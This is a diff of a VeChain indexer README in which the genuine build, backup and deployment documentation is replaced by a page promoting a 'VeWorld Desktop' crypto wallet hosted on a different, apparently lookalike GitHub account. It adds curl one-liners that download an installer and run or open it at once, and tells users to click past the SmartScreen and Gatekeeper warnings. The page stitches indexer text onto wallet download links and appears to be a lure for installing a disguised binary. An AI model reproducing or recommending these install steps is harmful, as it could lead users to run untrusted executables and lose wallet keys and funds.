@@ -1,224 +1,132 @@
-# VeWorld Indexer
+![VeWorld Desktop](assets/banner-hub.png)
 
-![Security Checks Badge](https://github.com/vechain/veworld-indexer/actions/workflows/security-checks.yml/badge.svg)
+# VeChain indexer
 
-[![Test, Publish & Deploy](https://github.com/vechain/veworld-indexer/actions/workflows/on-main.yml/badge.svg)](https://github.com/vechainfoundation/veworld-indexer/actions/workflows/on-main.yml)
+Indexers and APIs that turn VeChainThor chain data into records a front end can query.
 
-- Coverage Reports:
-    - [API](https://ideal-fortnight-7vp33mg.pages.github.io/api/coverage/)
-    - [Common](https://ideal-fortnight-7vp33mg.pages.github.io/common/coverage/)
-    - [Indexer](https://ideal-fortnight-7vp33mg.pages.github.io/indexer/coverage/)
+<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4"><img src="assets/badge-release.svg" alt="Release v2.2.4"></a></p>
 
-- Tests Results:
-    - [API](https://ideal-fortnight-7vp33mg.pages.github.io/api/tests/)
-    - [Common](https://ideal-fortnight-7vp33mg.pages.github.io/common/tests/)
-    - [Indexer](https://ideal-fortnight-7vp33mg.pages.github.io/indexer/tests/)
-    - [E2E](https://ideal-fortnight-7vp33mg.pages.github.io/e2e/tests/)
+## Downloads - v2.2.4
 
-## Prerequisites
+<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-- Docker
-- Java (v21)
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |
 
-### GitHub Packages Authentication (optional)
+> An indexer explains a record; only the current release explains the wallet that shows it.
 
-Normal builds resolve dependencies from Maven Central and do not require credentials. GitHub Packages credentials are only needed when resolving a dependency version that has not reached Maven Central yet, such as a SNAPSHOT or pre-release `org.vechain:indexer-core`.
+## What this repository is for
 
-For local Gradle builds, create a [GitHub Personal Access Token (classic)](https://github.com/settings/tokens/new?scopes=read:packages) with the `read:packages` scope and add the following to `~/.gradle/gradle.properties`:
+Indexers and APIs that turn VeChainThor chain data into records a front end can query. The indexer reads the chain and writes queryable records into MongoDB; the API layer serves those records over HTTP. Both are Spring applications, built with Gradle and run either directly or in Docker.
 
-```properties
-gpr.user=your-github-username
-gpr.key=your-github-pat
+The repository describes six indexers and six corresponding APIs, each pair enabled through its own Spring profile, with no dependency between pairs. The README records that independence as the reason one indexer can be started, debugged and restarted while the rest stay off. The cost it names is that each pair has its own configuration and its own database settings, so "run the indexer" is a choice among several rather than one action.
+
+The service is a long-running process with a database behind it, not a request-scoped function. Deployment is a versioned operation triggered from a workflow, and the README notes that the database, rather than the code, is the part that takes days to rebuild.
+
+## Who it is for
+
+- Backend developers running one indexer locally against a database.
+- Operators deploying a version and choosing a regular or blue/green strategy.
+- Teams restoring a known-good dump instead of reindexing from genesis.
+- Readers checking what production runs before changing a configuration.
+
+## Start here
+
+- [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/what-is-veworld-desktop.md) - introduces the desktop wallet, its platforms and its release source.
+- [Why VeWorld Desktop shows zero balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md) - the address, network and derivation path checked in order.
+- [What VTHO is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md) - the fee token that appears in the transfers this data describes.
+- [Pair a Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md) - how a hardware account is added to the wallet.
+
+## How to use these guides
+
+1. Run `make help` in an unfamiliar checkout before any other command.
+2. Copy each package's `.env.example` to `.env`; the defaults suit Docker.
+3. Choose the Docker-only path or the Docker-plus-IDE path for debugging.
+4. Take a backup with `make db-backup` before a destructive experiment.
+5. Deploy from the Prod Deployment workflow and record the version you chose.
+
+## The guides
+
+This repository has no article set of its own, so the guides below are the ones published in the same account.
+
+**Wallet basics** - [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/what-is-veworld-desktop.md), [Zero balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md), [Leaving Sync2](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md).
+
+**Tokens and fees** - [What VTHO is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md), [What VET is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md).
+
+**Hardware** - [Pair a Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md), [Ledger not detected](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-sync-not-detected-veworld-desktop.md).
+
+## What each guide changes
+
+| Task | Guide | Outcome |
+| --- | --- | --- |
+| Identify the wallet | [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/what-is-veworld-desktop.md) | The desktop app separated from the Foundation wallet of the same name |
+| Check a display | [Zero balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md) | Address, network and derivation path checked in that order |
+| Read a fee | [What VTHO is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md) | The fee token and its source understood before a send |
+| Add a hardware account | [Pair a Ledger](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md) | The device steps described, with signing confirmed on its screen |
+| Move an older wallet | [Leaving Sync2](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md) | A keystore import described in place of keeping a legacy client |
+
+## Common first questions
+
+### Do I need GitHub Packages credentials?
+
+Only when a dependency version has not reached Maven Central, such as a snapshot or pre-release of `org.vechain:indexer-core`. The README says normal builds resolve from Maven Central and need no authentication.
+
+### Why start only one indexer?
+
+Each pair has its own Spring profile and its own database settings, and the README records no dependency between pairs. Running one in isolation is what that design allows.
+
+### How is a deployment triggered?
+
+From the Prod Deployment workflow, which asks for a strategy and a version number in `major.minor.patch` form. The README says that version becomes the release and tag.
+
+## Before you install
+
+- Have Docker available for the containerised path and the local database.
+- Use Java 21 for a module run from an IDE or Gradle.
+- Confirm MongoDB is reachable at the configured address.
+- Take a backup before any step you cannot reverse.
+
+## About and license
+
+Indexers and APIs for VeChainThor chain data, as Spring applications with MongoDB behind them. This repository declares no licence file in its default branch, so no licence is granted or implied by this README; ask the repository owner before reusing the code. Downloads for the desktop wallet are published on the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4).
+
+## How to install VeWorld Desktop
+
+<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
+### Windows
+Quick install (CMD):
+
+```cmd
+curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
 ```
 
-For Docker builds, put those same properties in `gradle/docker.gradle.properties` or pass another readable file with `GRADLE_PROPERTIES_FILE=/path/to/gradle.properties make build-image`. The default Docker properties file is git-ignored and excluded from the Docker build context.
+Manual install:
+1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Getting Started
-
-- To see a list of all available commands, run `make help`
-- After starting the application, the swagger will be made available at `http://localhost:8080`
-
-### Option 1: Docker only
-
-- Copy env files for the two packages `./package/<package>/.env.example` to `./package/<package>/.env` and fill in the
-  values for your environment. They should work as-is for docker
-
-- Run:
-
-```
-make start
-```
-
-### Option 2: Docker + IntelliJ (Recommended for debugging)
-
-- No need to copy the environment files if you are using IntelliJ. The default variables should connect to the
-  infrastructure using localhost variables
-- Run:
+### macOS
+Quick install (Terminal):
 
 ```bash
-make db-all
+curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
 ```
 
-![img.png](images/intellij-start.png)
+Manual install:
+1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
 
-### Connecting to MongoDB
-
-Connect for the various users with the following URIs:
-
-- `indexer` - `mongodb://indexer:password@localhost:27017/vechain?directConnection=true&authMechanism=DEFAULT&authSource=admin`
-- `api` - `mongodb://api:password@localhost:27017/vechain?directConnection=true&authMechanism=DEFAULT&authSource=admin`
-- `root` - `mongodb://root:password@localhost:27017/admin?directConnection=true&authMechanism=DEFAULT`
-- Go to IndexerApplication.kt inside IntelliJ and run/debug:
-
-### Restarting
-
-- Clean and restart the DB:
-
-```bash
-make db-all
-```
-
-## Backup MongoDB
-You can back up the database by running the following command:
-
-```bash
-make db-backup
-```
-- Will back up the vechain database from localhost:27017
-- The backup will be stored in the database/backups/ directory.
-- The filename follows this format: database/backups/vechain-YYYYMMDDHHMMSS
-
-You can also specify the host and port of the MongoDB instance you want to backup:
-
-```bash
-make db-backup MONGO_HOST=my-mongo-host:32423
-```
-
-## Restore MongoDB from backup
-
-You can restore the database by running the following command:
-
-```bash
-make db-restore
-```
-- If no backup exists, you will be prompted to specify a backup directory.
-- By default, it restores from the latest backup found in the database/backups/ directory.
-
-To restore from a specific backup folder, specify DIR:
-```bash
-make db-restore DIR=backup/mydatabase-20250210
-```
-
-To restore to a different DB:
-```bash
-make db-restore MONGO_HOST=myserver.com
-```
-
-## Copy collections between databases
-
-To copy specific collections from one MongoDB cluster to another (e.g. from a local indexer into an Atlas cluster) without doing a full backup/restore round-trip:
-
-```bash
-make db-copy-collections
-```
-
-This launches the interactive wrapper at `database/restore/restore.sh`, which prompts for source/destination URIs (with `MONGO_PRESET_*` env-var presets) and the collection list, then drives the underlying `restore_local_dump.sh` end-to-end. See `database/restore/README.md` for full options including non-interactive use.
-
-## Features
-
-There are 6 indexers and 6 corresponding APIs. Each indexer can be run in isolation or all together. There is no
-dependency between indexers for this reason. Each indexer and API pair can be enabled using the corresponding spring
-profile.
-
-- `transactions` - enabled with `transactions` profile
-- `nfts` - enabled with `nfts` profile
-- `transfers` - enabled with `transfers` profile
-- `history` - enabled with `history` profile
-
-As you can see from the list above, the block indexer offers the option to proxy to the Thor node. This is useful if you
-want the convenience of the Block endpoints without the overhead of indexing the data.
-
-## Pruner
-Some of the indexers are stateful indexers. This means that records are updated with each block. In order to facilitate rollbacks we must store all previous version of each record. These records are stored in collections with a `-archives` postfix. As you might imagine these archive collections can get rather large over time. To prevent the collection from blowing up we have implemented an optional pruner service that can be enabled and configured with the following env variablers.
-
-- `PRUNER_INTERVAL` - How frequently to run the pruner (in blocks)
-- `PRUNER_REMOVAL_CHUNK_SIZE` - Sometimes the number of records to prune can be very large. To prevent mongoDB from blowing up we can set a chunk size for the delete operation
-- `PRUNER_RECORD_LIMIT` - You can set a limit on the number of records to prune in each run.
-
-## Testing
-
-- Run all the tests:
-
-```bash
-make test
-```
-
-### Package Testing
-
-- There are 4 packages that can be tested (`api`, `common`, `e2e`, `indexer`)
-- This will run all tests in a package (unit, integration and E2E)
-- Run (example for `api`):
-
-```bash
-make test-api
-make test-common
-make test-indexer
-make test-e2e
-```
-
-### E2E
-
-- Running E2E tests will spin up all the docker infrastructure before the test and tears it down after completion.
-  This is useful for testing the entire system, but it is slow. If you need to debug these tests, it is recommended to
-  spin up
-  the network manually using `make clean start` and remove the tasks `preE2e` and `postE2e` tasks
-  in `./packages/e2e/build.gradle.kts` ([here](./packages/e2e/build.gradle.kts))
-
-### API Schema Tests
-
-Use the schema-driven harness when you need to validate the public API in a deployed environment. It fetches the OpenAPI document from `/api-docs`, runs Schemathesis-based checks across every documented operation, and fails if any response exceeds 2 000 ms (override by setting `MAX_RESPONSE_MILLISECONDS`).
-
-- Local run: `packages/api/scripts/run_api_schema_tests.sh [dead|live|<base-url>] [--base-url <base-url>]` (defaults to the dead environment). Install `schemathesis` locally first, for example `pip install "schemathesis>=3.19,<4"`.
-- GitHub Action: trigger **API Tests** from the Actions tab and choose the target environment, or provide a full base URL override. The workflow uses the same script and publishes Schemathesis logs and JUnit XML as artifacts.
-
-## Disaster Recovery
-
-MongoDB Atlas snapshots are automatically exported daily to S3 (`veworld-indexer-atlas-backups`). In the event of data loss or cluster corruption where Atlas native snapshot restores are unavailable, the indexer can be restored from these S3 exports.
-
-The restore process involves downloading the gzipped JSON exports to an EC2 instance, streaming them into the target Atlas cluster via parallel `mongoimport` processes, and rebuilding indexes from the exported metadata files.
-
-For the full step-by-step runbook, see: **[Disaster Recovery Runbook](https://vechain.atlassian.net/wiki/x/AYCfe)**
-
-### Dead Prod Atlas Restore Workflow
-
-For Atlas-native recovery of the current dead prod color, use the **Restore Dead Prod From Atlas Snapshots** workflow. It restores both dead-prod Atlas clusters from the latest completed snapshots belonging to the current live prod color.
-
-This workflow does not stop or start ECS services. The dead environment must already be quiesced before restore. Use the **Stop or Start Dead Prod Environment Services** workflow first, then run the restore, then start services again once the restore summary looks correct.
-
-Recommended sequence:
-
-1. Run **Stop or Start Dead Prod Environment Services** with `stop`.
-2. Run **Restore Dead Prod From Atlas Snapshots**.
-3. Review the restore summary artifact and Atlas restore job IDs.
-4. Run **Stop or Start Dead Prod Environment Services** with `start`.
-5. Run the schema or regression tests against the dead environment before switching traffic.
-
-## Deployment & Testing
-
-The VeWorld Indexer can be deployed via two strategies: Regular or Blue/Green. To trigger a deployment, run the [Prod Deployment Workflow](https://github.com/vechain/veworld-indexer/actions/workflows/deploy-prod.yml). You will be prompted to select the deployment strategy and the version number. Please enter a version in the format `major.minor.patch` - this will be used to create a new release & tag. If in doubt about which environment is currently live, run the [Identify Live/Dead Environments](https://github.com/vechain/veworld-indexer/actions/workflows/identify-live-color.yml) workflow with the default arguments.
-
-### Regular Deployment
-Selecting the `regular` deployment strategy will trigger a deployment to the current live production environment. Most deployments will follow this process. Ensure any changes being deployed via this strategy have been sufficiently tested before triggering (testing process described below).
-
-### Blue/Green Deployment
-For code changes requiring a full reindex from the genesis block, deploy via the `blue/green` strategy. This will trigger a deployment to the dead color. Following deployment, a sufficient amount of time will need to be left (ie a few days) until the database has caught up with the latest block. After this point, the live environment can be switched from the current live color to the dead color. To do this, run the [Switch Live Environment](https://github.com/vechain/veworld-indexer/actions/workflows/switch-live-dns.yml) workflow. This will update the appropriate DNS records to redirect traffic to the alternate color environment. 
-
-Following the DNS switch, please wait at least 48 hours before tearing down the old live (now dead) environment. This is to allow any remote DNS caches to update to the new live environment.
-
-### Testing
-Since blue/green deployments are fairly infrequent, the dead color can be used as a transient testing environment when needed. This is preferable to using the dev environment because the dead color is an exact replica of the live environment, whereas dev is a more lightweight, stripped-down version, missing some key components like a mongo atlas cluster. Deployment to the dead color will be performed automatically on merge to main, *as long as the dead environment already exists*. The environment will therefore need to be deployed manually (either by deploying the terraform locally or by triggering a [Prod Deployment](https://github.com/vechain/veworld-indexer/actions/workflows/deploy-prod.yml) of the dead color).
-
-### Environment Tear-down
-When testing is complete, or when a DNS switch has migrated traffic from one environment to the other, the dead environment can be safely torn down until needed again. To do this, run the [Cluster Destroy](https://github.com/vechain/veworld-indexer/actions/workflows/destroy-environment.yml) workflow, and select the appropriate environment when prompted.
-
-Further details on the CICD process can be found [here](https://vechainfoundation-my.sharepoint.com/:w:/g/personal/dougal_rea_vechain_org/EcuW_jUEDh5PhS8jzH5PJ0EBw9pY8EqSd5IWKCJIG8rGVQ?e=i0Pa0N)
+### Linux
+<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
+     so no command is generated. The verified manual steps are kept below. -->
+Manual install:
+1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
+2. Unzip the archive.
+3. Run the application inside it.
+<!-- INSTALL-END -->
